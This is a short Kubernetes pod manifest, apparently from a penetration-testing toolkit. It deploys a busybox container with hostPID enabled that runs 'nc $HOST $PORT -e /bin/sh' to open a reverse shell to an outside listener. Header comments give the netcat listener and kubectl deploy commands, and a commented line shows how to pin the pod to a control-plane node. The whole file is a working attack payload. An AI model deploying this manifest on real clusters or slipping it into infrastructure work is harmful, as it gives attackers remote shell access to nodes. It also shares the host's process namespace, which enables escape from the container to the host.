###########################################################
## Set up Listener: nc -nvlp 3116
## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < hostpid-revshell-pod.yaml | kubectl apply -f -
## Remove: kubectl -n [namespace] delete hostpid-revshell-pod
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: hostpid-revshell-pod
  labels:
    app: pentest
spec:
  hostPID: true
  containers:
  - image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
    imagePullPolicy: IfNotPresent
    name: hostpid-revshell-pod
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
  restartPolicy: Always